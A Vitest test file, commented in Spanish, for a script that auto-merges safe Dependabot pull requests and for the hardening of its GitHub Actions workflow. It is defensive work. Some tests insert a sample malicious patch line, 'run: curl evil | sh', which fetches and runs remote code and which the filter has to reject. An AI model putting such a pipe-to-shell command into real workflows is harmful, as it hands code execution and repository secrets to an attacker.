// La fusión sola de Dependabot (#193): qué PR entra y cuál no, y que el
// workflow no abra la puerta al código del PR.

import { readdirSync, readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";

import {
  CERO,
  clasificar,
  commitsDeDependabot,
  decidir,
  DECISIONES,
  dependenciasDe,
  ESTE_WORKFLOW,
  fusionarConApp,
  linea,
  MOTIVOS,
  pasada,
  revisarFicheros,
  saltoDe,
  soloCambiaUses,
  textoFiable,
  usaEnvironment,
  usaSecretos,
} from "./dependabot-auto.mjs";

const REPO = "pabloam89/MenuPlan";
const SHA = "a".repeat(40);
const fixture = (f) => readFileSync(new URL(`./fixtures/${f}`, import.meta.url), "utf8");

const commitBot = (msg = "") => ({
  author: { login: "dependabot[bot]" },
  committer: { login: "web-flow" },
  commit: { message: msg, verification: { verified: true, reason: "valid" } },
});
const verde = { id: 2, name: "tests", app: { slug: "github-actions" }, head_sha: SHA, status: "completed", conclusion: "success" };
const npm = [{ filename: "package.json", patch: "x" }, { filename: "package-lock.json", patch: "x" }];

// Un parche real de Dependabot en un workflow fijado por SHA.
const PARCHE_USES = [
  "@@ -28,7 +28,7 @@ jobs:",
  "     steps:",
  "-      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7",
  "+      - uses: actions/checkout@0123456789abcdef0123456789abcdef01234567 # v7.1.0",
  "         with:",
].join("\n");
const actions = [{ filename: ".github/workflows/tests.yml", patch: PARCHE_USES }];

function datos(extra = {}) {
  const { pr = {}, ...resto } = extra;
  return {
    repo: REPO,
    pr: {
      number: 165,
      title: "chore(deps-dev): bump fast-uri from 3.1.6 to 3.1.8",
      body: "",
      user: { login: "dependabot[bot]", type: "Bot" },
      base: { ref: "staging" },
      head: { sha: SHA, repo: { full_name: REPO } },
      mergeable: true,
      ...pr,
    },
    commits: [commitBot()],
    ficheros: npm,
    checks: [verde],
    staging: { atrasado: false, ficheros: [], truncado: false },
    rebasePedido: false,
    ...resto,
  };
}

describe("dependabot-auto: tamaño del salto", () => {
  it("parche y menor, sí; mayor, no", () => {
    expect(saltoDe("8.5.15", "8.5.29")).toBe("menor");
    expect(saltoDe("2.9.0", "2.27.0")).toBe("menor");
    expect(saltoDe("9.39.4", "10.0.1")).toBe("mayor");
  });
  it("en 0.x, cambiar la menor es mayor", () => {
    expect(saltoDe("0.5.2", "0.5.7")).toBe("menor");
    expect(saltoDe("0.129.0", "0.131.0")).toBe("mayor");
  });
  it("prerelease o SHA: no se sabe", () => {
    expect(saltoDe("1.0.0", "1.1.0-beta.1")).toBe("desconocida");
    expect(saltoDe("3d3c42e", "1234abc")).toBe("desconocida");
  });
});

describe("dependabot-auto: clasificar un PR", () => {
  it("título «from A to B»", () => expect(clasificar({ titulo: "bump postcss from 8.5.15 to 8.5.29" }).tipo).toBe("menor"));
  it("sin versión en el título, la saca del cuerpo", () =>
    expect(clasificar({ titulo: "bump @vitest/mocker and vitest", textos: ["Updates `vitest` from 4.1.7 to 4.1.11\n"] }).tipo).toBe("menor"));

  // La tabla real de #169 sin las mayores ni las 0.x (que ahora van a npm-cero).
  const TABLA_169 = [
    "| [@google/genai](x) | `2.9.0` | `2.27.0` |",
    "| [@supabase/supabase-js](x) | `2.108.2` | `2.117.2` |",
    "| [@upstash/redis](x) | `1.38.0` | `1.39.0` |",
    "| [@vercel/functions](x) | `3.9.9` | `3.9.11` |",
    "| [papaparse](x) | `5.5.3` | `5.7.0` |",
    "| [pdfjs-dist](x) | `6.3.289` | `6.4.299` |",
    "| [react](x) | `19.2.4` | `19.3.0` |",
    "| [@types/react](x) | `19.2.14` | `19.3.0` |",
    "| [react-dom](x) | `19.2.4` | `19.3.0` |",
    "| [@types/react-dom](x) | `19.2.3` | `19.3.0` |",
    "| [zod](x) | `4.4.3` | `4.6.5` |",
    "| [@remotion/cli](x) | `4.0.520` | `4.0.533` |",
    "| [@remotion/google-fonts](x) | `4.0.520` | `4.0.533` |",
    "| [@vercel/blob](x) | `2.4.1` | `2.8.1` |",
    "| [@vitejs/plugin-react](x) | `6.0.1` | `6.1.2` |",
    "| [eslint-plugin-react-hooks](x) | `7.0.1` | `7.1.1` |",
    "| [globals](x) | `17.4.0` | `17.13.0` |",
    "| [pg](x) | `8.23.0` | `8.23.1` |",
    "| [remotion](x) | `4.0.520` | `4.0.533` |",
    "| [vite](x) | `8.2.2` | `8.3.3` |",
  ].join("\n");
  const TITULO_MENORES = "chore(deps): bump the npm-menores group across 1 directory with 20 updates";
  it("la tabla real de #169, sin mayores ni 0.x, es menor", () =>
    expect(clasificar({ titulo: TITULO_MENORES, textos: [`Bumps the npm-menores group with 20 updates:\n\n${TABLA_169}`] }).tipo).toBe("menor"));
  it("con una fila mayor en la tabla, mayor", () => {
    const tabla = `${TABLA_169}\n| [eslint](x) | \`9.39.4\` | \`10.12.0\` |`;
    expect(clasificar({ titulo: TITULO_MENORES, textos: [tabla] }).tipo).toBe("mayor");
  });
  it("una 0.x que Dependabot llama minor sigue siendo mayor", () =>
    expect(clasificar({ titulo: TITULO_MENORES, textos: ["Updates `@anthropic-ai/sdk` from 0.129.0 to 0.131.0"] }).tipo).toBe("mayor"));
  it("el grupo -menores sin versiones legibles cuenta como menor", () =>
    expect(clasificar({ titulo: "bump the npm-menores group across 1 directory with 5 updates" }).tipo).toBe("menor"));
  it("-mayores es mayor; npm-cero (u otro grupo) lo mira una sesión", () => {
    expect(clasificar({ titulo: "bump the npm-mayores group with 2 updates" }).tipo).toBe("mayor");
    expect(clasificar({ titulo: "bump the npm-cero group with 1 update", textos: ["Updates `sharp` from 0.35.3 to 0.35.5"] }).tipo).toBe("grupo-manual");
  });
  it("sin versiones ni grupo, no se sabe", () => expect(clasificar({ titulo: "bump baseline-browser-mapping in /dish-gallery" }).tipo).toBe("desconocida"));
  it("el punto final de una frase no corta la versión", () =>
    expect(clasificar({ titulo: "x", textos: ["Bumps [a](u) from 1.2.1 to 2.0.0."] }).tipo).toBe("mayor"));

  describe("con el PR real #110 (actions, dos mayores)", () => {
    const titulo = "chore(ci): Bump the actions-semanal group across 1 directory with 2 updates";
    const cuerpo = fixture("dependabot-pr110-cuerpo.md");
    const commit = fixture("dependabot-pr110-commit.txt");
    it("las notas de versión (<details>) no cuentan: 2 pares, no 19", () => {
      expect(clasificar({ titulo, textos: [cuerpo] }).pares).toEqual([["4", "7"], ["4", "6"]]);
      expect(textoFiable(cuerpo)).not.toMatch(/Release notes|<\/?details>/);
    });
    it("el update-type del commit manda: dos semver-major", () => expect(clasificar({ titulo, textos: [commit] }).metadatos).toEqual(["mayor", "mayor"]));
    it("y se queda (grupo que no es -menores, y además mayor)", () => {
      const r = clasificar({ titulo: titulo.replace("actions-semanal", "actions-menores"), textos: [cuerpo, commit] });
      expect(r.tipo).toBe("mayor");
    });
  });
  it("update-type menor manda sobre un texto que no se lee (un SHA)", () => {
    const yml = "---\nupdated-dependencies:\n- dependency-name: actions/checkout\n  update-type: version-update:semver-minor\n...";
    expect(clasificar({ titulo: "bump actions/checkout from 3d3c42e to 0123456", textos: [yml] }).tipo).toBe("menor");
  });
  it("update-type menor pero el texto dice mayor: gana mayor", () => {
    const yml = "update-type: version-update:semver-minor";
    expect(clasificar({ titulo: "bump x from 0.3.1 to 0.4.0", textos: [yml] }).tipo).toBe("mayor");
  });
});

describe("dependabot-auto: quién y qué", () => {
  it("commits de Dependabot firmados por GitHub, sí", () => expect(commitsDeDependabot([commitBot()])).toBe(true));
  it("un commit de otra persona, aunque se haga pasar por el bot en el correo, no", () => {
    const falso = { ...commitBot(), committer: { login: "pabloam89" }, commit: { verification: { verified: false, reason: "unsigned" } } };
    expect(commitsDeDependabot([commitBot(), falso])).toBe(false);
    expect(commitsDeDependabot([{ ...commitBot(), author: { login: "pabloam89" } }])).toBe(false);
  });
  it("firmado y con el correo del bot, pero empujado por otra persona: no", () =>
    expect(commitsDeDependabot([{ ...commitBot(), committer: { login: "pabloam89" } }])).toBe(false));
  it("del bot y por web-flow, pero sin firma válida: no", () =>
    expect(commitsDeDependabot([{ ...commitBot(), commit: { verification: { verified: true, reason: "unknown_key" } } }])).toBe(false));

  it("npm: solo package.json y package-lock.json de la raíz", () => {
    expect(revisarFicheros(npm)).toEqual({ ruta: "npm", motivo: null });
    expect(revisarFicheros([{ filename: "dish-gallery/package.json" }]).motivo).toBe("ficheros-fuera");
    expect(revisarFicheros([{ filename: "dish-gallery/package-lock.json" }, ...npm]).motivo).toBe("ficheros-fuera");
    expect(revisarFicheros([{ filename: "package-lock.json" }, { filename: "scripts/x.mjs" }]).motivo).toBe("ficheros-fuera");
    expect(revisarFicheros([]).motivo).toBe("ficheros-fuera");
  });
  it("actions: solo .github/workflows/*.yml, y npm y actions a la vez no", () => {
    expect(revisarFicheros(actions)).toEqual({ ruta: "actions", motivo: null });
    expect(revisarFicheros([{ filename: ".github/workflows/sub/x.yml", patch: PARCHE_USES }]).motivo).toBe("ficheros-fuera");
    expect(revisarFicheros([{ filename: ".github/dependabot.yml", patch: PARCHE_USES }]).motivo).toBe("ficheros-fuera");
    expect(revisarFicheros([...actions, ...npm]).motivo).toBe("ficheros-fuera");
  });
  it("actions: si cambia algo más que una línea uses:, no", () => {
    expect(soloCambiaUses(PARCHE_USES)).toBe(true);
    expect(soloCambiaUses(`${PARCHE_USES}\n-        run: npm ci\n+        run: curl evil | sh`)).toBe(false);
    expect(soloCambiaUses(`${PARCHE_USES}\n+        run: curl evil | sh`)).toBe(false);
    expect(soloCambiaUses(PARCHE_USES.replace("+      - uses: actions/checkout@", "+      - uses: otro/checkout@"))).toBe(false);
    expect(soloCambiaUses(PARCHE_USES.replace("# v7.1.0", "# v7.1.0\n+        with: { ref: x }"))).toBe(false);
    expect(soloCambiaUses(undefined)).toBe(false); // sin parche (fichero enorme): no
    expect(revisarFicheros([{ filename: ".github/workflows/tests.yml", patch: "@@\n-x: 1\n+x: 2" }]).motivo).toBe("cambia-mas-que-uses");
  });
});

describe("dependabot-auto: decidir", () => {
  const motivo = (d) => decidir(datos(d)).motivo;
  it("el caso bueno de npm se fusiona", () => expect(decidir(datos())).toMatchObject({ decision: "fusionado", motivo: "-", tipo: "menor", ruta: "npm" }));
  it("el de actions, con las mismas comprobaciones, queda como fusionable por la ruta actions", () => {
    const pr = { title: "chore(ci): bump the actions-menores group with 1 update", body: "Updates `actions/checkout` from 7.0.0 to 7.1.0" };
    expect(decidir(datos({ pr, ficheros: actions }))).toMatchObject({ decision: "fusionado", ruta: "actions" });
    expect(decidir(datos({ pr, ficheros: actions, commits: [{ ...commitBot(), author: { login: "algbarc" } }] })).motivo).toBe("commits-ajenos");
    expect(decidir(datos({ pr, ficheros: actions, checks: [{ ...verde, head_sha: "b".repeat(40) }] })).motivo).toBe("tests-no-verde");
  });
  it("abierto por otro: no", () => expect(motivo({ pr: { user: { login: "dependabot[bot]", type: "User" } } })).toBe("autor"));
  it("contra main: no", () => expect(motivo({ pr: { base: { ref: "main" } } })).toBe("base"));
  it("desde un fork: no", () => expect(motivo({ pr: { head: { sha: SHA, repo: { full_name: "otro/MenuPlan" } } } })).toBe("rama-ajena"));
  it("con un commit ajeno: no", () => expect(motivo({ commits: [commitBot(), { ...commitBot(), author: { login: "algbarc" } }] })).toBe("commits-ajenos"));
  it("en dish-gallery: no", () =>
    expect(motivo({ pr: { title: "bump postcss from 8.5.15 to 8.5.29 in /dish-gallery" }, ficheros: [{ filename: "dish-gallery/package-lock.json" }] })).toBe("ficheros-fuera"));
  it("mayor: se queda", () => expect(motivo({ pr: { title: "bump vite from 5.4.21 to 8.3.4" } })).toBe("mayor"));
  it("grupo npm-cero: se queda", () => expect(motivo({ pr: { title: "bump the npm-cero group with 1 update" } })).toBe("grupo-manual"));
  it("un PR suelto (de seguridad) de una dependencia de CERO: se queda, aunque sea parche", () => {
    expect(motivo({ pr: { title: "chore(deps-dev): bump sharp from 0.35.5 to 0.35.6" } })).toBe("grupo-manual");
    const yml = '---\nupdated-dependencies:\n- dependency-name: "@anthropic-ai/sdk"\n  dependency-version: 0.129.1\n...';
    const pr = { title: "chore(deps): bump @anthropic-ai/sdk", body: "Bumps [@anthropic-ai/sdk](u) from 0.129.0 to 0.129.1." };
    expect(motivo({ pr, commits: [commitBot(yml)] })).toBe("grupo-manual");
    expect(dependenciasDe({ titulo: "bump x", textos: [yml] })).toEqual(["@anthropic-ai/sdk"]);
    expect(dependenciasDe({ titulo: "bump @vitest/mocker and vitest", textos: ["Updates `vitest` from 4.1.7 to 4.1.11"] })).toEqual(["vitest"]);
  });
  it("tests en rojo, o en verde pero de otro SHA (un run viejo): no", () => {
    expect(motivo({ checks: [{ ...verde, conclusion: "failure" }] })).toBe("tests-no-verde");
    expect(motivo({ checks: [{ ...verde, head_sha: "b".repeat(40) }] })).toBe("tests-no-verde");
    expect(motivo({ checks: [verde, { ...verde, id: 3, conclusion: "failure" }] })).toBe("tests-no-verde");
    expect(motivo({ checks: [] })).toBe("tests-no-verde");
  });
  it("con conflicto, o sin calcular: no", () => {
    expect(motivo({ pr: { mergeable: false } })).toBe("conflicto");
    expect(motivo({ pr: { mergeable: null } })).toBe("mergeable-desconocido");
  });
  it("atrasado sin pisar sus ficheros: se fusiona", () =>
    expect(decidir(datos({ staging: { atrasado: true, ficheros: ["src/a.js"], truncado: false } })).decision).toBe("fusionado"));
  it("atrasado y staging tocó sus ficheros: pide rebase, una vez", () => {
    const staging = { atrasado: true, ficheros: ["package-lock.json"], truncado: false };
    expect(decidir(datos({ staging })).decision).toBe("rebase");
    expect(decidir(datos({ staging, rebasePedido: true })).motivo).toBe("rebase-ya-pedido");
    expect(decidir(datos({ staging: { atrasado: true, ficheros: [], truncado: true } })).decision).toBe("rebase");
  });
  it("cada línea usa el vocabulario cerrado", () => {
    expect(linea({ pr: 165, ...decidir(datos()) })).toBe("dependabot-auto pr: 165 decision: fusionado motivo: - tipo: menor ruta: npm");
    const fuente = readFileSync(new URL("./dependabot-auto.mjs", import.meta.url), "utf8");
    for (const m of fuente.matchAll(/(?:espera\(|motivo: )"([\w-]+)"/g)) expect(MOTIVOS).toContain(m[1]);
    for (const m of fuente.matchAll(/decision: "([\w-]+)"/g)) expect(DECISIONES).toContain(m[1]);
  });
});

describe("dependabot-auto.yml: no abre la puerta al PR", () => {
  const yml = readFileSync(new URL("../.github/workflows/dependabot-auto.yml", import.meta.url), "utf8");
  const sinComentarios = yml.replace(/\s#.*$/gm, "");
  const [, jobPasada = "", jobApp = ""] = sinComentarios.split(/^ {2}(?=[\w-]+:\n)/m).filter((b) => !b.startsWith("name:")).slice(-3);
  const pasos = (job) => job.split(/\n {6}- /).slice(1);
  const permisos = (job) =>
    (/^ {4}permissions:\n((?: {6}\S.*\n)+)/m.exec(job)?.[1] ?? "").trim().split("\n").map((l) => l.trim()).sort();

  it("dos jobs, pasada y fusionar-app, y este solo tras aquel y con un PR apuntado", () => {
    expect(jobPasada).toMatch(/^pasada:\n/);
    expect(jobApp).toMatch(/^fusionar-app:\n/);
    expect(jobApp).toMatch(/^ {4}needs: pasada$/m);
    expect(jobApp).toMatch(/^ {4}if: needs\.pasada\.outputs\.app_pr != ''$/m);
  });
  it("solo workflow_run de Tests, programado y a mano; nunca pull_request_target", () => {
    expect(sinComentarios).not.toMatch(/pull_request_target/);
    expect(sinComentarios).toMatch(/workflow_run:\s*\n\s*workflows: \[Tests\]/);
  });
  it("cada acción fijada por SHA", () => {
    const usos = [...sinComentarios.matchAll(/uses:\s*(\S+)/g)].map((m) => m[1]);
    expect(usos).toHaveLength(3);
    for (const u of usos) expect(u).toMatch(/@[0-9a-f]{40}$/);
  });
  it("cada checkout es de staging (literal), sin credenciales y solo del script", () => {
    for (const job of [jobPasada, jobApp]) {
      expect(job.match(/actions\/checkout@/g)).toHaveLength(1);
      expect(job).toMatch(/ref: staging\n/);
      expect(job).toMatch(/persist-credentials: false/);
      expect(job).toMatch(/sparse-checkout: scripts\/dependabot-auto\.mjs\n/);
    }
    expect(sinComentarios).not.toMatch(/head_sha|head_branch\s*\}\}|pull_request\.head|refs\/pull|default_branch/);
  });
  it("permisos: ninguno arriba; la pasada escribe con el GITHUB_TOKEN, el de la App solo lee con él", () => {
    expect(sinComentarios).toMatch(/^permissions: \{\}$/m);
    expect(permisos(jobPasada)).toEqual(["checks: read", "contents: write", "pull-requests: write"]);
    expect(permisos(jobApp)).toEqual(["checks: read", "contents: read", "pull-requests: read"]);
  });
  it("la pasada no ve el environment, ni secretos, ni variables", () => {
    expect(jobPasada).not.toMatch(/environment:|secrets\.|vars\./);
    expect(jobApp).toMatch(/^ {4}environment: dependabot-auto$/m);
  });
  it("la clave solo entra en el paso del token, por SHA, con repo literal y los tres permisos justos", () => {
    const conClave = pasos(jobApp).filter((p) => /secrets\.DEPENDABOT_APP_KEY\b(?! != '')/.test(p));
    expect(conClave).toHaveLength(1);
    expect(conClave[0]).toMatch(/uses: actions\/create-github-app-token@[0-9a-f]{40}/);
    expect(conClave[0]).toMatch(/if: env\.HAY_CLAVE == 'true'/);
    expect(conClave[0]).toMatch(/owner: pabloam89\n/);
    expect(conClave[0]).toMatch(/repositories: MenuPlan\n/);
    expect([...conClave[0].matchAll(/permission-([\w-]+): (\w+)/g)].map((m) => `${m[1]}: ${m[2]}`).sort()).toEqual([
      "contents: write",
      "pull-requests: write",
      "workflows: write",
    ]);
    const conToken = pasos(jobApp).filter((p) => p.includes("steps.app.outputs.token"));
    expect(conToken).toHaveLength(1);
    expect(conToken[0]).toMatch(/--fusionar-app/);
    expect([...sinComentarios.matchAll(/secrets\.(\w+)/g)].map((m) => m[1]).every((s) => s === "DEPENDABOT_APP_KEY")).toBe(true);
  });
  it("concurrency dentro de cada job, no arriba (los runs que se saltan el job no cancelan la pasada que espera)", () => {
    expect(sinComentarios).not.toMatch(/^concurrency:/m);
    expect(jobPasada).toMatch(/^ {4}concurrency:\n {6}group: dependabot-auto\n {6}cancel-in-progress: false/m);
    expect(jobApp).toMatch(/^ {4}concurrency:\n {6}group: dependabot-auto-app\n {6}cancel-in-progress: false/m);
  });
});

describe("dependabot-auto: workflows con environment del repo", () => {
  const dir = new URL("../.github/workflows/", import.meta.url);
  const workflows = readdirSync(dir).filter((f) => /\.ya?ml$/.test(f));
  it("usaEnvironment ve los que declaran uno (y no el que solo lo nombra en un comentario)", () => {
    const con = workflows.filter((f) => usaEnvironment(readFileSync(new URL(f, dir), "utf8"))).sort();
    const grep = workflows.filter((f) => /^\s+environment:/m.test(readFileSync(new URL(f, dir), "utf8"))).sort();
    expect(con).toEqual(grep);
    expect(con).toEqual(expect.arrayContaining(["dependabot-auto.yml", "mercadona-sync.yml", "vigia-lola.yml"]));
    expect(usaEnvironment("# el environment: vigia\njobs:\n  x:\n    runs-on: u\n")).toBe(false);
    expect(usaEnvironment(null)).toBe(true);
  });
  it("usaSecretos: cualquier secrets. (del repo o de un environment); sin contenido, sí", () => {
    const agente = readFileSync(new URL("agente-fallos.yml", dir), "utf8");
    expect(usaSecretos(agente)).toBe(true);
    expect(usaSecretos(readFileSync(new URL("tests.yml", dir), "utf8"))).toBe(false);
    expect(usaSecretos("# secrets.X en un comentario\njobs: {}\n")).toBe(false);
    expect(usaSecretos(null)).toBe(true);
  });
  it("en un workflow con secretos, una acción de un tercero (claude-code-action) no entra sola", () => {
    const parche = [
      "@@ -97,7 +97,7 @@ jobs:",
      "-        uses: anthropics/claude-code-action@1111111111111111111111111111111111111111 # v1",
      "+        uses: anthropics/claude-code-action@2222222222222222222222222222222222222222 # v1.1.0",
    ].join("\n");
    const agente = ".github/workflows/agente-fallos.yml";
    expect(revisarFicheros([{ filename: agente, patch: parche }], [], [agente]).motivo).toBe("tercero-con-secretos");
    // la misma acción en un workflow sin secretos pasa ese filtro
    expect(revisarFicheros([{ filename: ".github/workflows/tests.yml", patch: parche }], [], [agente]).motivo).toBe(null);
  });
  it("en ese mismo workflow con secretos, actions/checkout (o github/…) pasa ese filtro", () => {
    const agente = ".github/workflows/agente-fallos.yml";
    expect(revisarFicheros([{ filename: agente, patch: PARCHE_USES }], [], [agente]).motivo).toBe(null);
    const deGithub = PARCHE_USES.replaceAll("actions/checkout", "github/codeql-action/init");
    expect(revisarFicheros([{ filename: agente, patch: deGithub }], [], [agente]).motivo).toBe(null);
  });
  it("un PR de actions que toca este workflow, o uno con environment, no entra solo", () => {
    expect(revisarFicheros([{ filename: ESTE_WORKFLOW, patch: PARCHE_USES }]).motivo).toBe("toca-este-workflow");
    const vigia = { filename: ".github/workflows/vigia-lola.yml", patch: PARCHE_USES };
    expect(revisarFicheros([...actions, vigia], [vigia.filename]).motivo).toBe("toca-workflow-con-environment");
    expect(revisarFicheros(actions, [vigia.filename]).motivo).toBe(null);
  });
});

describe("dependabot.yml: lo pequeño, lo grande y las 0.x, por separado", () => {
  const yml = readFileSync(new URL("../.github/dependabot.yml", import.meta.url), "utf8");
  const pkg = JSON.parse(readFileSync(new URL("../package.json", import.meta.url), "utf8"));
  it("cada ecosistema con su grupo -menores (minor y patch) y -mayores (major)", () => {
    for (const eco of ["npm", "actions"]) {
      expect(yml).toMatch(new RegExp(`${eco}-menores:\\n(?: {8}.*\\n)*? {8}update-types: \\[minor, patch\\]`));
      expect(yml).toMatch(new RegExp(`${eco}-mayores:\\n(?: {8}.*\\n)*? {8}update-types: \\[major\\]`));
    }
  });
  it("CERO (la constante del script) son las 0.x directas, y va a npm-cero y fuera de menores y mayores", () => {
    const cero = Object.entries({ ...pkg.dependencies, ...pkg.devDependencies })
      .filter(([, v]) => /^[\^~]?0\./.test(v))
      .map(([n]) => n)
      .sort();
    expect([...CERO].sort()).toEqual(cero);
    const lista = (re) => JSON.parse(re.exec(yml)?.[1] ?? "[]").sort();
    expect(lista(/npm-cero:\n(?: {8}.*\n)*? {8}patterns: (\[.*\])/)).toEqual(cero);
    expect(lista(/npm-menores:\n(?: {8}.*\n)*? {8}exclude-patterns: (\[.*\])/)).toEqual(cero);
    expect(lista(/npm-mayores:\n(?: {8}.*\n)*? {8}exclude-patterns: (\[.*\])/)).toEqual(cero);
    expect(yml.indexOf("npm-cero:")).toBeLessThan(yml.indexOf("npm-menores:"));
  });
  it("cooldown de 5 días en cada ecosistema", () => expect(yml.match(/cooldown:\n {6}default-days: 5\n/g)).toHaveLength(2));
  it("todo contra staging", () => {
    const ramas = [...yml.matchAll(/target-branch: (\S+)/g)].map((m) => m[1]);
    expect(ramas).toEqual(["staging", "staging"]);
  });
});

describe("dependabot-auto: la pasada y la fusión con la App, con una API falsa", () => {
  const prNpm = (n, extra = {}) => ({ ...datos().pr, number: n, ...extra });
  const prActions = (n) => prNpm(n, { title: "chore(ci): bump the actions-menores group with 1 update", body: "Updates `actions/checkout` from 7.0.0 to 7.1.0" });
  const WORKFLOW_SIN_ENV = "jobs:\n  tests:\n    runs-on: ubuntu-latest\n";

  // prs: { n: { pr, ficheros, compare } }. Devuelve el cliente y lo que escribió.
  function apiFalsa(prs) {
    const escrito = [];
    const api = async (ruta, { method = "GET", body } = {}) => {
      if (method !== "GET") {
        escrito.push({ method, ruta, body });
        return {};
      }
      let m;
      if ((m = /^\/pulls\/(\d+)$/.exec(ruta))) return prs[m[1]].pr;
      if ((m = /^\/compare\/([0-9a-f]+)\.\.\.staging$/.exec(ruta))) {
        const n = Object.keys(prs).find((k) => prs[k].pr.head.sha === m[1]);
        return prs[n].compare ?? { ahead_by: 0, files: [] };
      }
      if (ruta.startsWith("/contents/")) return { content: Buffer.from(WORKFLOW_SIN_ENV).toString("base64") };
      throw new Error(`ruta no prevista: ${ruta}`);
    };
    const paginas = async (ruta) => {
      let m;
      if (ruta.startsWith("/pulls?state=open")) return Object.values(prs).map((p) => p.pr);
      if ((m = /^\/pulls\/(\d+)\/commits$/.exec(ruta))) return [commitBot()];
      if ((m = /^\/pulls\/(\d+)\/files$/.exec(ruta))) return prs[m[1]].ficheros;
      if (ruta.startsWith("/commits/")) return [{ ...verde, head_sha: /^\/commits\/(\w+)\//.exec(ruta)[1] }];
      if (ruta.startsWith("/issues/")) return [];
      throw new Error(`ruta no prevista: ${ruta}`);
    };
    return { api, paginas, escrito };
  }
  const sha = (c) => c.repeat(40);
  const mundo = () => ({
    1: { pr: prNpm(1, { head: { sha: sha("1"), repo: { full_name: REPO } } }), ficheros: npm },
    2: {
      pr: prNpm(2, { head: { sha: sha("2"), repo: { full_name: REPO } } }),
      ficheros: npm,
      compare: { ahead_by: 1, files: [{ filename: "package-lock.json" }] },
    },
    3: { pr: { ...prActions(3), head: { sha: sha("3"), repo: { full_name: REPO } } }, ficheros: actions },
    4: { pr: { ...prActions(4), head: { sha: sha("4"), repo: { full_name: REPO } } }, ficheros: actions },
  });
  const sinRuido = { log: () => {}, esperar: async () => {} };

  it("en ensayo no escribe nada: ni PUT, ni POST, ni salida para la App", async () => {
    const f = apiFalsa(mundo());
    const salidas = [];
    const r = await pasada({ ...f, repo: REPO, si: false, salida: (k, v) => salidas.push([k, v]), ...sinRuido });
    expect(f.escrito).toEqual([]);
    expect(salidas).toEqual([]);
    expect(r.lineas.map((l) => /haria: (\S+)/.exec(l)?.[1] ?? /motivo: (\S+)/.exec(l)[1])).toEqual(["fusionado", "rebase", "para-app", "app-ocupada"]);
  });
  it("con --si: fusiona npm con su SHA, pide rebase, apunta el primero de actions y el segundo, app-ocupada", async () => {
    const f = apiFalsa(mundo());
    const salidas = [];
    const r = await pasada({ ...f, repo: REPO, si: true, salida: (k, v) => salidas.push([k, v]), ...sinRuido });
    expect(f.escrito).toEqual([
      { method: "PUT", ruta: "/pulls/1/merge", body: { sha: sha("1"), merge_method: "merge" } },
      { method: "POST", ruta: "/issues/2/comments", body: { body: "@dependabot rebase" } },
    ]);
    expect(salidas).toEqual([["app_pr", 3], ["app_sha", sha("3")]]);
    expect(r.lineas[2]).toMatch(/pr: 3 decision: para-app .*ruta: actions/);
    expect(r.lineas[3]).toMatch(/pr: 4 decision: espera motivo: app-ocupada/);
    expect(r.fallos).toBe(0);
  });
  it("fusionar con la App: sin clave no hace nada y no falla", async () => {
    const f = apiFalsa(mundo());
    const l = await fusionarConApp({ ...f, repo: REPO, appToken: "", ...sinRuido }, 3, sha("3"));
    expect(l).toMatch(/motivo: sin-clave-app/);
    expect(f.escrito).toEqual([]);
  });
  it("fusionar con la App: si el PR ya no está en el SHA apuntado, no", async () => {
    const f = apiFalsa(mundo());
    const conApp = [];
    const clienteApp = () => ({ api: async (...a) => conApp.push(a) });
    const l = await fusionarConApp({ ...f, repo: REPO, appToken: "t", clienteApp, ...sinRuido }, 3, sha("9"));
    expect(l).toMatch(/motivo: sha-cambiado/);
    expect(conApp).toEqual([]);
  });
  it("fusionar con la App: el bueno se fusiona con el token de la App (y no con el GITHUB_TOKEN)", async () => {
    const f = apiFalsa(mundo());
    const conApp = [];
    const clienteApp = (token) => ({ api: async (ruta, o) => conApp.push({ token, ruta, ...o }) });
    const l = await fusionarConApp({ ...f, repo: REPO, appToken: "t", clienteApp, ...sinRuido }, 3, sha("3"));
    expect(l).toMatch(/pr: 3 decision: fusionado/);
    expect(conApp).toEqual([{ token: "t", ruta: "/pulls/3/merge", method: "PUT", body: { sha: sha("3"), merge_method: "merge" } }]);
    expect(f.escrito).toEqual([]);
  });
  it("fusionar con la App: uno de npm que llegara aquí, no", async () => {
    const f = apiFalsa(mundo());
    const conApp = [];
    const l = await fusionarConApp({ ...f, repo: REPO, appToken: "t", clienteApp: () => ({ api: async (...a) => conApp.push(a) }), ...sinRuido }, 1, sha("1"));
    expect(l).toMatch(/ruta: npm/);
    expect(conApp).toEqual([]);
  });
});
